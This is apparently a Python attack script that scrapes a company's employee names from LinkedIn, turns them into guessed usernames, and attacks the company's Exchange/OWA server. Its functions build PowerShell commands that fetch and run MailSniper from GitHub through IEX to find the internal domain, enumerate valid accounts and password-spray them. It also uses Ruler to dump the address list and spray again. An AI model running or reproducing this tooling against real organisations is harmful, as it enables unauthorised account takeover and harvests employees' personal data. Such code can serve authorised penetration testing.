from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time, getpass, re, os, signal, sys, zipfile, urllib.request

def signal_handler(sig, frame):
    print('You pressed Ctrl+C!')
    os.system("taskkill /F /im firefox.exe")
    sys.exit(0)

def setup_env():
    if os.name != "nt":
        print("Script must run on windows.")
        sys.exit(0)
    
    if not os.path.exists('geckodriver.exe'):
        print("Downloading geckodriver.exe")
        urllib.request.urlretrieve ("https://github.com/mozilla/geckodriver/releases/download/v0.29.0/geckodriver-v0.29.0-win64.zip", "geckodriver.zip")
        with zipfile.ZipFile("geckodriver.zip", 'r') as zip_ref:
            zip_ref.extractall(".")
            
        os.remove("geckodriver.zip")
            
    if not os.path.exists('ruler-win64.exe'):
        print("Downloading ruler-win64.exe")
        urllib.request.urlretrieve ("https://github.com/sensepost/ruler/releases/download/2.4.1/ruler-win64.exe", "ruler-win64.exe")
        
    signal.signal(signal.SIGINT, signal_handler)

def clean_users(tmp):
    result = tmp.split("$$$,")
    usernames = []
    for line in result:
        firstname = line.split(" ")[0].lower()
        secondname = line.split(" ")[1].lower()
        fn = re.sub(r"[^a-z]+", "", firstname)
        sn = re.sub(r"[^a-z]+", "", secondname)

        # print(firstname+" "+secondname+" -> "+fn+" "+sn)
        if( len(fn) > 2 and len(sn) > 2):
            usernames.append(fn+" "+sn)
            
    return usernames

def mailsniper_internaldomain(server, company_name):
    command = 'PowerShell.exe -c "IEX (New-Object Net.WebClient).DownloadString("""https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1"""); Invoke-DomainHarvestOWA -ExchHostname ' + server + '; Invoke-DomainHarvestOWA -ExchHostname ' + server + ' -CompanyName \'' + company_name + '\' -Brute"'
    print(command)
    os.system(command)

def mailsniper_userenum(server, internal_domain, infile, outfile):
    command = 'PowerShell.exe -c "IEX (New-Object Net.WebClient).DownloadString("""https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1"""); Invoke-UsernameHarvestOWA -ExchHostname ' + server + ' -Domain ' + internal_domain + ' -UserList ' + infile + ' -OutFile ' + outfile +'"'
    print(command)
    os.system(command)
    
def mailsniper_passwordspray(server, password, validusers, outfile):
    command = 'PowerShell.exe -c "IEX (New-Object Net.WebClient).DownloadString("""https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1"""); Invoke-PasswordSprayOWA -ExchHostname ' + server + ' -UserList ' + validusers + ' -Password \''+ password + '\' -Threads 5 -OutFile ' + outfile +'"'
    print(command)
    os.system(command)

def ruler_addresslist(email, user, password, outfile):
    command = ".\\ruler-win64.exe --nocache -k --verbose -email " + email + " -u " + user + " -p \"" + password + "\" abk dump --output " + outfile 
    print(command)
    os.system(command)

def name_schema(usernames):
    filetmp = open("employees.txt","w")
    for i in range(10):
        firstname = usernames[i].split(" ")[0]
        secondname = usernames[i].split(" ")[1]
        
        filetmp.write(firstname+"."+secondname+"\n")
        filetmp.write(firstname+"_"+secondname+"\n")
        filetmp.write(firstname+secondname+"\n")
        filetmp.write(firstname[0]+"."+secondname+"\n")
        filetmp.write(firstname[0]+secondname+"\n")
        filetmp.write(firstname+"."+secondname[0]+"\n")
        
        if(i == 9):
            filetmp.write(firstname+secondname[0])
        else:
            filetmp.write(firstname+secondname[0]+"\n")
        
    filetmp.close()

def name_schema_generate(usernames, schema):
    filetmp = open("employees_name_generated.txt","w")
    if schema == "1":
        for user in usernames:
            firstname = user.split(" ")[0]
            secondname = user.split(" ")[1]
            if usernames.index(user) == len(usernames)-1:
                filetmp.write(firstname+"."+secondname)
            else:
                filetmp.write(firstname+"."+secondname+"\n")
    elif schema == "2":
        for user in usernames:
            firstname = user.split(" ")[0]
            secondname = user.split(" ")[1]
            if usernames.index(user) == len(usernames)-1:
                filetmp.write(firstname+secondname)
            else:
                filetmp.write(firstname+secondname+"\n")
    elif schema == "3":
        for user in usernames:
            firstname = user.split(" ")[0]
            secondname = user.split(" ")[1]
            if usernames.index(user) == len(usernames)-1:
                filetmp.write(firstname[0]+"."+secondname)
            else:
                filetmp.write(firstname[0]+"."+secondname+"\n")
    elif schema == "4":
        for user in usernames:
            firstname = user.split(" ")[0]
            secondname = user.split(" ")[1]
            if usernames.index(user) == len(usernames)-1:
                filetmp.write(firstname[0]+secondname)
            else:
                filetmp.write(firstname[0]+secondname+"\n")
    else:
        print("Not valid schema number")
    filetmp.close()

def modify_address_list(internal_domain):
    f1 = open("address_list.txt", "r")
    f2 = open("modified_address_list.txt", "w")
    for line in f1:
        line1 = line.split(" ")[-1]
        line2 = line1.split("@")[0]
        user = internal_domain + "\\" + line2
        f2.write(user+"\n")
    f1.close()
    f2.close()

def get_employees(username, password, company_id):
    print("Creating the web driver instance...")
    options = webdriver.FirefoxOptions() # comment this line to make visible
    options.add_argument('-headless') # comment this line to make visible
    driver = webdriver.Firefox(options=options) # remove this "options=options" to make visible
    driver.get('https://www.linkedin.com/login')

    print("Authenticating to linkedIn...")
    user = driver.find_element_by_id('username')
    passwd = driver.find_element_by_id('password')
    submit = driver.find_element(By.XPATH, '//button[text()="Sign in"]')
    user.send_keys(username)
    passwd.send_keys(password)
    submit.click()

    company_url = "https://www.linkedin.com/company/" + company_id + "/people/"
    print("Loading the company url:", company_url)
    driver.get(company_url)

    print("Starting employees collection script (maximum 1000)...")
    driver.execute_script("""
    result = document.createElement("P")
    result.innerText = "-1"
    result.id = '40404040'
    document.body.appendChild(result)

    num_of_employees = document.createElement("P")
    num_of_employees.innerText = "-1"
    num_of_employees.id = '50505050'
    document.body.appendChild(num_of_employees)

    num_of_collected_employess = document.createElement("P")
    num_of_collected_employess.innerText = "-1"
    num_of_collected_employess.id = '60606060'
    document.body.appendChild(num_of_collected_employess)

    arr = []
            
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms))
    }
            
    async function connections() {
        while(1){
            window.scrollTo(0,document.body.scrollHeight/0)
            await sleep(2000)
            window.scrollTo(0,document.body.scrollHeight/1)
            await sleep(2000)
                
            count = parseInt(document.getElementsByClassName('t-20 t-black t-bold')[0].innerText.split(" ")[0])
            document.getElementById('50505050').innerText = count
        
            data = document.getElementsByClassName('artdeco-entity-lockup__title ember-view')
            document.getElementById('60606060').innerText = data.length
        
            if(data.length >= count || data.length >= 1000) { break }
        }

        data = document.getElementsByClassName('org-people-profile-card__profile-title t-black lt-line-clamp lt-line-clamp--single-line ember-view')
        for(i=1;i<data.length;i++){
            if(i == data.length-1){
            arr.push(data[i].innerText)
            }
            else{
            arr.push(data[i].innerText+"$$$")
            }
        }
      
        document.getElementById('40404040').innerText = arr
    }
            
    connections()
    """)

    print("Starting the monitor script...")
    while(1):
        time.sleep(5)
        result = driver.execute_script("return document.getElementById('40404040').innerText")
        num_of_employees = driver.execute_script("return document.getElementById('50505050').innerText")
        print("Number of total employees:", num_of_employees)
        num_of_collected_employess = driver.execute_script("return document.getElementById('60606060').innerText")
        print("Number of collected employees:", num_of_collected_employess)
        
        if result != '-1':
            driver.quit()
            break
          
        print("Script still working...")
    
    print("Script finished his execution.")
    return result

try:
    setup_env()
    """
    print("Enter your linkedin information...")
    username = input('Enter your email: ')
    password = getpass.getpass('Enter your password: ')
    company_id = input('Enter the linkedin company ID you want to search: ')
    
    print("Exec get employees.")
    result = get_employees(username, password, company_id)
    
    print("Exec clean users.")
    employees = clean_users(result)
    
    print("Exec name schema.")
    name_schema(employees)
    
    server = input('Enter the company exchange server domain: ')
    company_name = input('Enter the comapany name: ')
    
    print("Exec internal domain.")
    mailsniper_internaldomain(server, company_name)
    
    internal_domain = input('Enter the comapany internal domain: ')
    
    print("Exec user enum.")
    mailsniper_userenum(server, internal_domain, "employees.txt", "employees_schema.txt")
    
    schema = input('Enter the employees schema (1)first.last (2)firstlast (3)f.last (4)flast: ')
    
    print("Exec name schema generate.")
    name_schema_generate(employees, schema)
    
    print("Exec user enum.")
    mailsniper_userenum(server, internal_domain, "employees_name_generated.txt", "valid_employees_usernames.txt")
    
    password = input('Enter the password you want to use: ')
    print("Exec password spray.")
    mailsniper_passwordspray(server, password, "valid_employees_usernames.txt", "valid_passwords_part1.txt")
    
    valid_email = input('Enter a valid email (username@domain.com): ')
    valid_username = input('Enter a valid username: ')
    valid_password = input('Enter a valid password: ')
    
    print("Exec address list.")
    ruler_addresslist(valid_email, valid_username, valid_password, "address_list.txt")

    print("Exec modify address list.")
    modify_address_list(internal_domain)
    
    print("Exec password spray.")
    mailsniper_passwordspray(server, valid_password, "modified_address_list.txt", "valid_passwords_part2.txt")
    """
except Exception as e:
    print('Exception has occurred!', e)
    os.system("taskkill /F /im firefox.exe")
    sys.exit(0)
